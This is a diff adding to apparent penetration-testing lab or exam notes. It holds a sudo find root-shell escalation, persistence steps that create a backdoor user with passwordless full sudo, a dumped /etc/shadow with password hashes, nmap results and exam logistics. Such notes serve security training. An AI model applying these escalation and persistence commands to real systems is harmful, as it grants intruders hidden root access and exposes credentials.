@@ -211,6 +211,98 @@ first look in sudo -l. we see that we can run the find command with sudo without
 	> sudo find . -exec /bin/bash \; -quit
 	
 
+Create a new user for persistence
+
+	> useradd jacob
+
+change your default shell to bash
+
+	> chsh --shell /bin/bash jacob
+
+add the following to your /etc/sudoers file
+	
+	> jacob   ALL=(ALL:ALL) NOPASSWD:ALL
+
+/etc/shadow file:
+
+root:$6$M8VTycN3$h0P4t.psV8rIgeV4y067rlPOBoz.vZL46LKylxU5njS6wbW35lehtXK2qBDxglF9k9yVAwhQIZ1Xn.w26rip2.:19124:0:99999:7:::
+daemon:*:18325:0:99999:7:::
+bin:*:18325:0:99999:7:::
+sys:*:18325:0:99999:7:::
+sync:*:18325:0:99999:7:::
+games:*:18325:0:99999:7:::
+man:*:18325:0:99999:7:::
+lp:*:18325:0:99999:7:::
+mail:*:18325:0:99999:7:::
+news:*:18325:0:99999:7:::
+uucp:*:18325:0:99999:7:::
+proxy:*:18325:0:99999:7:::
+www-data:*:18325:0:99999:7:::
+backup:*:18325:0:99999:7:::
+list:*:18325:0:99999:7:::
+irc:*:18325:0:99999:7:::
+gnats:*:18325:0:99999:7:::
+nobody:*:18325:0:99999:7:::
+systemd-network:*:18325:0:99999:7:::
+systemd-resolve:*:18325:0:99999:7:::
+syslog:*:18325:0:99999:7:::
+messagebus:*:18325:0:99999:7:::
+_apt:*:18325:0:99999:7:::
+lxd:*:18325:0:99999:7:::
+uuidd:*:18325:0:99999:7:::
+dnsmasq:*:18325:0:99999:7:::
+landscape:*:18325:0:99999:7:::
+sshd:*:18325:0:99999:7:::
+pollinate:*:18325:0:99999:7:::
+ubuntu:!:19121:0:99999:7:::
+Aaron:$6$3gC8TXmG$60iE2VGE7Wk1/XqYTLAAdqjqVukfrCKbOZZuj.IxlpI7T.LZkZjKUojqPYOcf/swGR.UKxxZM0LxagLO5GtK61:19121:0:99999:7:::
+jacob:$6$0LoShyQg$uwRLPG7zM03hIFXlifafgOHez9buUyvPxFHvULHtO1sjq5zDmaFWrAjppvxbKOdAMOhrTFrJvukzJEwHMMANJ1:19124:0:99999:7:::
+
+
+next literally install nmap on the RoundSensor 
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-05-12 17:20 UTC
+Nmap scan report for 192.168.28.179
+Host is up (-0.15s latency).
+
+PORT     STATE SERVICE
+3389/tcp open  ms-wbt-server
+9999/tcp open  abyss
+
+TEST NOTES
+
+31 questions | 155 points
+
+part 1 | 16 questions | 80 points
+
+part 2 | 15 questions | 75 points
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+MINIMUM NEEDED TO PASS: 22 questions | 110 points
+
+0800-1100 part 1
+
+1100-1200 lunch
+
+1200-1500 part 2
+
+-------------------------------------------------------------------------------------------------------------------------------------------------------
+
+NOTE: if your xfreerdp says something like this: 
+
+The host key for localhost has changed
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@    WARNING: REMOTE HOST IDENTIFICATION HAS CHANGED!     @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+IT IS POSSIBLE THAT SOMEONE IS DOING SOMETHING NASTY!
+
+
+add '/cert-ignore ' to the end of your xfreerdp syntax
+
+
+
+
 
 
 
